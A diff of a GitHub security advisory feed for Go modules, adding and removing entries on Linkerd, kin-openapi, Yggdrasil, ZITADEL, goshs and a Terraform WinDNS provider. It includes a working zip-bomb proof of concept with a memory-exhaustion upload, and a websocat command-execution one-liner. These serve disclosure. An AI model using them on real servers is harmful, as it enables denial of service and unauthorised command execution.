@@ -6,6 +6,48 @@
     "description": "Security Advisory for Go modules on GitHub",
     "items": [
         {
+            "content_html": "<p>In Linkerd edge releases before edge-25.2.1, and Buoyant Enterprise for Linkerd releases 2.13.0–2.13.7, 2.14.0–2.14.10, 2.15.0–2.15.7, 2.16.0–2.16.4, and 2.17.0–2.17.1, resource exhaustion can occur for Linkerd proxy metrics.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-43915\">https://nvd.nist.gov/vuln/detail/CVE-2025-43915</a></li>\n<li><a href=\"https://docs.buoyant.io/security/advisories/2025-01\">https://docs.buoyant.io/security/advisories/2025-01</a></li>\n<li><a href=\"https://www.buoyant.io/resources\">https://www.buoyant.io/resources</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-42mr-jpwh-m9rv\">https://github.com/advisories/GHSA-42mr-jpwh-m9rv</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-42mr-jpwh-m9rv",
+            "title": "[github.com/linkerd/linkerd2] Linkerd resource exhaustion vulnerability",
+            "date_modified": "2025-05-15T16:57:28.000Z",
+            "date_published": "2025-05-05T18:32:53.000Z",
+            "author": {
+                "name": "GitHub",
+                "url": "https://github.com/advisories/GHSA-42mr-jpwh-m9rv"
+            },
+            "tags": [
+                "severity"
+            ]
+        },
+        {
+            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When validating a request with a multipart/form-data schema, if the OpenAPI schema allows it, an attacker can upload a crafted ZIP file (e.g., a ZIP bomb), causing the server to consume all available system memory.</p>\n<h3 id=\"details\">Details</h3>\n<p>The root cause comes from the <a href=\"https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523\">ZipFileBodyDecoder</a>, which is registered <a href=\"https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275\">automatically</a> by the module (contrary to what the <a href=\"https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse\">documentation says</a>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To reproduce the vulnerability, you can use the following OpenAPI schema:</p>\n<pre><code class=\"language-yaml\">openapi: 3.0.0\ninfo:\n  title: 'Validator'\n  version: 0.0.1\npaths:\n  /:\n    post:\n      requestBody:\n        required: true\n        content:\n          multipart/form-data:\n            schema:\n              type: object\n              required:\n                - file\n              properties:\n                file:\n                  type: string\n                  format: binary\n      responses:\n        '200':\n          description: Created\n</code></pre>\n<p>And this code to validate the request (nothing fancy, it basically only calls the <code>openapi3filter.ValidateRequest</code> function`):</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n\n    \"github.com/getkin/kin-openapi/openapi3filter\"\n    legacyrouter \"github.com/getkin/kin-openapi/routers/legacy\"\n\n    \"github.com/getkin/kin-openapi/openapi3\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    loader := openapi3.NewLoader()\n\n    doc, err := loader.LoadFromFile(\"schema.yaml\")\n    if err != nil {\n        http.Error(w, \"Failed to load OpenAPI document\", http.StatusInternalServerError)\n        return\n    }\n\n    if err := doc.Validate(r.Context()); err != nil {\n        http.Error(w, \"Invalid OpenAPI document\", http.StatusBadRequest)\n        return\n    }\n\n    router, err := legacyrouter.NewRouter(doc)\n    if err != nil {\n        http.Error(w, \"Failed to create router\", http.StatusInternalServerError)\n        return\n    }\n\n    route, pathParams, err := router.FindRoute(r)\n    if err != nil {\n        http.Error(w, \"Failed to find route\", http.StatusNotFound)\n        return\n    }\n\n    input := &amp;openapi3filter.RequestValidationInput{\n        Request:     r,\n        QueryParams: r.URL.Query(),\n        Route:       route,\n        PathParams:  pathParams,\n    }\n\n    if err := openapi3filter.ValidateRequest(r.Context(), input); err != nil {\n        http.Error(w, fmt.Sprintf(\"Request validation failed: %v\", err), http.StatusBadRequest)\n        return\n    }\n\n    w.Write([]byte(\"request ok !\"))\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    log.Fatal(http.ListenAndServe(\":8080\", nil))\n\n}\n</code></pre>\n<p>We also need to create a zip bomb. This command will create a 4.7GB file and compress it to to 4.7MB zip archive:</p>\n<pre><code class=\"language-shell\">perl -e 'print \"0\" x 5000000000' &gt; /tmp/bigfile.txt; zip -9 /tmp/bomb.zip /tmp/bigfile.txt\n</code></pre>\n<p>Run the PoC provided, and upload the zip bomb with <code>curl localhost:8080/  -F file=\"@/tmp/bomb.zip;type=application/zip\" -v</code>.</p>\n<p>Observe the memory consumption of the test server during and after the upload (it jumped to a bit over 22GB in my testing, with only a 4.7MB input file, you can reduce the size of the generated file to not kill your test machine when reproducing.) </p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can trigger an out-of-memory (OOM) condition, leading to server crashes or degraded performance.\nIt seems to only be exploitable if the OpenAPI schema allows for multipart upload.</p>\n<h3 id=\"remediation\">Remediation</h3>\n<p>I see at least 2 potential fixes/improvements:</p>\n<ul>\n<li>Do not register by default the zip file decoder (I honestly was a bit surprised to see it was enabled by default, it seems to be quite a niche use-case ?)</li>\n<li>Update <code>ZipFileBodyDecoder</code> to enforce a maximum size of the decompressed archive and bailout as soon as it's reached (probably with a small default value and allow the users to configure it through the input options ?)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9\">https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9</a></li>\n<li><a href=\"https://github.com/getkin/kin-openapi/pull/1059\">https://github.com/getkin/kin-openapi/pull/1059</a></li>\n<li><a href=\"https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1\">https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1</a></li>\n<li><a href=\"https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275\">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275</a></li>\n<li><a href=\"https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523\">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523</a></li>\n<li><a href=\"https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse\">https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30153\">https://nvd.nist.gov/vuln/detail/CVE-2025-30153</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wq9g-9vfc-cfq9\">https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-wq9g-9vfc-cfq9",
+            "title": "[github.com/getkin/kin-openapi] Improper Handling of Highly Compressed Data (Data Amplification) in github.com/getkin/kin-openapi/openapi3filter",
+            "date_modified": "2025-05-15T16:44:41.000Z",
+            "date_published": "2025-03-19T18:12:53.000Z",
+            "author": {
+                "name": "GitHub",
+                "url": "https://github.com/advisories/GHSA-wq9g-9vfc-cfq9"
+            },
+            "tags": [
+                "severity"
+            ]
+        },
+        {
+            "content_html": "<p>A flaw was found in Yggdrasil, which acts as a system broker, allowing the processes to communicate to other children's \"worker\" processes through the DBus component. Yggdrasil creates a DBus method to dispatch messages to workers. However, it misses authentication and authorization checks, allowing every system user to call it. One available Yggdrasil worker acts as a package manager with capabilities to create and enable new repositories and install or remove packages. </p>\n<p>This flaw allows an attacker with access to the system to leverage the lack of authentication on the dispatch message to force the Yggdrasil worker to install arbitrary RPM packages. This issue results in local privilege escalation, enabling the attacker to access and modify sensitive system data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3931\">https://nvd.nist.gov/vuln/detail/CVE-2025-3931</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2025:7592\">https://access.redhat.com/errata/RHSA-2025:7592</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-3931\">https://access.redhat.com/security/cve/CVE-2025-3931</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2362345\">https://bugzilla.redhat.com/show_bug.cgi?id=2362345</a></li>\n<li><a href=\"https://github.com/RedHatInsights/yggdrasil/commit/196d0cbea42f72e6dfecaa563681a99e9fdb4a38\">https://github.com/RedHatInsights/yggdrasil/commit/196d0cbea42f72e6dfecaa563681a99e9fdb4a38</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rpg2-jvhp-h354\">https://github.com/advisories/GHSA-rpg2-jvhp-h354</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-rpg2-jvhp-h354",
+            "title": "[github.com/redhatinsights/yggdrasil] Yggdrasil Vulnerable to Local Privilege Escalation",
+            "date_modified": "2025-05-15T16:06:21.000Z",
+            "date_published": "2025-05-14T12:31:12.000Z",
+            "author": {
+                "name": "GitHub",
+                "url": "https://github.com/advisories/GHSA-rpg2-jvhp-h354"
+            },
+            "tags": [
+                "severity"
+            ]
+        },
+        {
             "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Minting large amount of tokens through ibc transfer and then depositing them in validator rewards pool (via <code>DepositValidatorRewardsPool</code> message) can lead to integer overflow panic when calculating <code>cumulative_reward_ratio</code> for the validator.</p>\n<p>This calculation happens in <code>x/epoching</code> module <code>EndBlocker</code>, thus the panic will halt the chain.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Denial of Service - Due to panic in the <code>EndBlocker</code> Babylon Genesis will halt</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-869w-47c6-fq8q\">https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-869w-47c6-fq8q</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-869w-47c6-fq8q\">https://github.com/advisories/GHSA-869w-47c6-fq8q</a></li>\n</ul>\n",
             "url": "https://github.com/advisories/GHSA-869w-47c6-fq8q",
             "title": "[github.com/babylonlabs-io/babylon] Babylon Integer Overflow in Distribution Module CumulativeRewardRatio Calculation Leading to Chain Halt",
@@ -238,48 +280,6 @@
             "author": {
                 "name": "GitHub",
                 "url": "https://github.com/advisories/GHSA-g4r8-mp7g-85fq"
-            },
-            "tags": [
-                "severity"
-            ]
-        },
-        {
-            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>ZITADEL offers developers the ability to manage user sessions using the <a href=\"https://zitadel.com/docs/category/apis/resources/session_service_v2/session-service\">Session API</a>. This API enables the use of IdPs for authentication, known as idp intents.</p>\n<p>Following a successful idp intent, the client receives an id and token on a predefined URI. These id and token can then be used to authenticate the user or their session.</p>\n<p>However, it was possible to exploit this feature by repeatedly using intents. This allowed an attacker with access to the application’s URI to retrieve the id and token, enabling them to authenticate on behalf of the user.</p>\n<p>It’s important to note that the use of additional factors (MFA) prevents a complete authentication process and, consequently, access to the ZITADEL API.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>3.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.0.0\">3.0.0</a>\n2.71.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.9\">2.71.9</a>\n2.x versions are fixed on &gt;=<a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.10\">2.70.10</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The recommended solution is to update ZITADEL to a patched version.</p>\n<h3 id=\"questions\">Questions</h3>\n<p>If you have any questions or comments about this advisory, please email us at <a href=\"mailto:security@zitadel.com\">security@zitadel.com</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to Józef Chraplewski from Nedap for reporting this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/zitadel/zitadel/security/advisories/GHSA-g4r8-mp7g-85fq\">https://github.com/zitadel/zitadel/security/advisories/GHSA-g4r8-mp7g-85fq</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/commit/b1e60e7398d677f08b06fd7715227f70b7ca1162\">https://github.com/zitadel/zitadel/commit/b1e60e7398d677f08b06fd7715227f70b7ca1162</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.70.10\">https://github.com/zitadel/zitadel/releases/tag/v2.70.10</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/releases/tag/v2.71.9\">https://github.com/zitadel/zitadel/releases/tag/v2.71.9</a></li>\n<li><a href=\"https://github.com/zitadel/zitadel/releases/tag/v3.0.0\">https://github.com/zitadel/zitadel/releases/tag/v3.0.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-46815\">https://nvd.nist.gov/vuln/detail/CVE-2025-46815</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4r8-mp7g-85fq\">https://github.com/advisories/GHSA-g4r8-mp7g-85fq</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-g4r8-mp7g-85fq",
-            "title": "[github.com/zitadel/zitadel] ZITADEL Allows IdP Intent Token Reuse",
-            "date_modified": "2025-05-06T19:57:19.000Z",
-            "date_published": "2025-05-06T16:51:16.000Z",
-            "author": {
-                "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-g4r8-mp7g-85fq"
-            },
-            "tags": [
-                "severity"
-            ]
-        },
-        {
-            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>It seems that when running <strong>goshs</strong> without arguments it is possible for anyone to execute commands on the server. This was tested on version <strong>1.0.4</strong> of <strong>goshs</strong>. The command function was introduced in version <strong>0.3.4</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>It seems that the function <code>dispatchReadPump</code> does not checks the option cli <code>-c</code>, thus allowing anyone to execute arbitrary command through the use of websockets.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Used <strong>websocat</strong> for the POC:</p>\n<pre><code class=\"language-bash\">echo -e '{\"type\": \"command\", \"content\": \"id\"}' |./websocat 'ws://192.168.1.11:8000/?ws' -t\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability will only impacts goshs server on vulnerable versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/patrickhener/goshs/security/advisories/GHSA-rwj2-w85g-5cmm\">https://github.com/patrickhener/goshs/security/advisories/GHSA-rwj2-w85g-5cmm</a></li>\n<li><a href=\"https://github.com/patrickhener/goshs/commit/160220974576afe5111485b8d12fd36058984cfa\">https://github.com/patrickhener/goshs/commit/160220974576afe5111485b8d12fd36058984cfa</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-46816\">https://nvd.nist.gov/vuln/detail/CVE-2025-46816</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rwj2-w85g-5cmm\">https://github.com/advisories/GHSA-rwj2-w85g-5cmm</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-rwj2-w85g-5cmm",
-            "title": "[github.com/patrickhener/goshs] goshs route not protected, allows command execution",
-            "date_modified": "2025-05-06T21:44:06.000Z",
-            "date_published": "2025-05-06T16:45:17.000Z",
-            "author": {
-                "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-rwj2-w85g-5cmm"
-            },
-            "tags": [
-                "severity"
-            ]
-        },
-        {
-            "content_html": "<h2 id=\"impact\">Impact:</h2>\n<p>A security issue has been found in <code>terraform-provider-windns</code> before version <code>1.0.5</code>. The <code>windns_record</code> resource did not santize the input variables. This can lead to authenticated command injection in the underlyding powershell command prompt.</p>\n<h2 id=\"patches\">Patches:</h2>\n<p><a href=\"https://github.com/nrkno/terraform-provider-windns/commit/c76f69610c1b502f90aaed8c4f102194530b5bce\"><code>83ef736 (fix: better input validation)</code></a></p>\n<h2 id=\"fixed-versions\">Fixed versions:</h2>\n<ul>\n<li><code>v1.0.5</code></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nrkno/terraform-provider-windns/security/advisories/GHSA-4vgf-2cm4-mp7c\">https://github.com/nrkno/terraform-provider-windns/security/advisories/GHSA-4vgf-2cm4-mp7c</a></li>\n<li><a href=\"https://github.com/nrkno/terraform-provider-windns/commit/c76f69610c1b502f90aaed8c4f102194530b5bce\">https://github.com/nrkno/terraform-provider-windns/commit/c76f69610c1b502f90aaed8c4f102194530b5bce</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-46735\">https://nvd.nist.gov/vuln/detail/CVE-2025-46735</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4vgf-2cm4-mp7c\">https://github.com/advisories/GHSA-4vgf-2cm4-mp7c</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-4vgf-2cm4-mp7c",
-            "title": "[github.com/nrkno/terraform-provider-windns] Terraform WinDNS Provider improperly sanitizes input variables in `windns_record`",
-            "date_modified": "2025-05-06T19:56:58.000Z",
-            "date_published": "2025-05-06T16:38:44.000Z",
-            "author": {
-                "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-4vgf-2cm4-mp7c"
             },
             "tags": [
                 "severity"
